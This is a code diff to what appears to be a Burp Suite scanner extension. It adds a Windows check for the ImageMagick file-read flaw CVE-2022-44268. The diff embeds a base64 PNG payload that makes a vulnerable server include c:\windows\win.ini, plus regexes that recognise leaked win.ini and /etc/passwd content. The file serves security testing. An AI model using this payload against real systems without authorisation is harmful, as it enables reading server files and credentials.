@@ -139,6 +139,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
     MARKER_CACHE_DEFEAT_URL = "https://example.org/cachedefeat/"
     NEWLINE = "\r\n"
     REGEX_PASSWD = re.compile("[^:]{3,20}:[^:]{1,100}:\d{0,20}:\d{0,20}:[^:]{0,100}:[^:]{0,100}:[^:]*$")
+    REGEX_WIN_INI = re.compile(r"^\[(fonts|extensions|mci extensions|files|Mail)\]$", re.IGNORECASE)
     # TODO: If we just add \\ the extension uploads *a lot more* files... worth doing?
     PROTOCOLS_HTTP = (
         # 'ftp://',
@@ -1706,6 +1707,35 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                                  "See https://nvd.nist.gov/vuln/detail/CVE-2022-44268 for details. " \
                                  "Extracted content: <br><br><pre>" + result + '</pre>'
                         issue = self._create_issue_template(injector.get_brr(), name + " CVE-2022-44268", detail, confidence, severity)
+                        issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
+                        self._add_scan_issue(issue)
+
+        # Windows variant: read c:\windows\win.ini
+        basename_win = BurpExtender.DOWNLOAD_ME + self.FILE_START + "ImWinIni"
+        content_win = 'iVBORw0KGgoAAAANSUhEUgAAAP8AAAD/CAIAAACxapedAAAAGnRFWHRwcm9maWxlAGM6XHdpbmRvd3Ncd2luLmluadI1NckAAAR5SURBVHic7dLZbeNQFERBGpj8U/Z8GbBhSyLFt9ylCp1Bn4/j8/gwa7l/x+fH8XmYNZz6resO9VvPHeq3njvUbz13qN967lC/9dwv6rce+4v6rcEeUL9V32Pqt9J7Sv1Wd6+o34ruBPVbxZ2jfiu309RvtXaF+q3QLlK/Vdl16rcSe4v6Lf/epX5LvhvUb5l3j/ot7W5Tv+XcCOq3hBtE/ZZt46jfUm0o9VuejaZ+S7IJ1G8ZNof6LfymUb/F3kzqt8CbTP0WdfOp30JuCfVbvK2ifgu2hdRvkbaW+i3MllO/xdgO6rcA20T9tnv7qN+2biv1277tpn7btADUbzsWg/pt+cJQv61dJOq3hQtG/bZq8ajfliwk9dv8RaV+m7zA1G8zF5v6bdrCU7/NWQbqtwlLQv02enmo34YuFfXbuGWjfhu0hNRvI5aT+u320lK/3Vtm6rcbS0799u7yU7+9tRLUb9dXhfrt4gpRv11ZLeq30ytH/XZuFanfTqwo9dur1aV+e7rS1G+PV5367cEaUL/9tR7Ub7/Whvrt5zpRv31bM+q3r/WjfjuOz90ZbqJ+293gPupvv8bU33u9qb/x2lN/16H+puM4DvV3HF/U32x8o/5O4yf1txm/qL/H+Iv6G4wH1F99PKb+0uMp9dcdr6i/6DhB/RXHOeovN05Tf61xhfoLjYvUX2Vcp/4S4y3qzz/epf7k4wb1Zx73qD/tuE39OccI6k84BlF/tjGO+lONodSfZ4ym/iRjAvVnGHOoP/yYRv2xx0zqDzwmU3/UMZ/6Q44l1B9vrKL+YGMh9Ucaa6k/zFhO/THGDuoPMDZR/+6xj/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+qXfl/ql35f6pd+X+nc/wD7t66ex3vXTW+P6aa9r/dC0fjiOo2P98KVZ/fBNp/rhpzb1wy896oe/NKgfHqhePzxWun54qm798ErR+uGEivXDOeXqh9Nq1Q9XFKofLqpSP1xXon54S/764V3J64cbMtcP96StH27LWT+MkLB+GCRb/TBOqvphqDz1w2hJ6ocJMtQPc4SvH6aJXT/MFLh+mCxq/TBfyPphiXj1wyrB6oeFItUPa4WpH5aLUT/sEKB+2GR3/bDP1vphq331w26b6ocAdtQPMSyvH8JYWz9EsrB+CGZV/RDPkvohpPn1Q1ST64fAZtYPsU2rH8KbUz9kMKF+SGJ0/ZDH0PohlXH1QzaD6oeERtQPOd2uH9K6Vz9kdqN+SO7d+iG/t+qHEq7XD1VcrB8KuVI/1HK6fijnXP1Q0Yn6oahX9UNdT+uH0h7XD9U9qB8a+Kt+6OFX/dDGz/qhk2/1QzNf9UM//wED8Ar4V9hhcwAAAABJRU5ErkJggg=='
+        content_win = content_win.decode("base64")
+        urrs_win = self._send_simple(injector, {('', '.png', 'image/png')}, basename_win, content_win, redownload=True)
+        for urr in urrs_win:
+            if urr and urr.download_rr:
+                resp = urr.download_rr.getResponse()
+                if resp:
+                    resp = FloydsHelpers.jb2ps(resp).split("\r\n\r\n", 1)[1]
+
+                    try:
+                        result = _read_ztxt_chunk_from_png(resp)
+                    except Exception:
+                        result = None
+
+                    if result and any(BurpExtender.REGEX_WIN_INI.search(line) for line in result.split('\n') if line):
+                        name = "ImageMagick Local File Include"
+                        severity = "High"
+                        confidence = "Firm"
+
+                        detail = "A win.ini-like response was downloaded when uploading a PNG file with a payload that " \
+                                 "tries to include c:\\windows\\win.ini. Therefore arbitrary file read seems possible. " \
+                                 "See https://nvd.nist.gov/vuln/detail/CVE-2022-44268 for details. " \
+                                 "Extracted content: <br><br><pre>" + result + '</pre>'
+                        issue = self._create_issue_template(injector.get_brr(), name + " CVE-2022-44268 (Windows)", detail, confidence, severity)
                         issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                         self._add_scan_issue(issue)
 
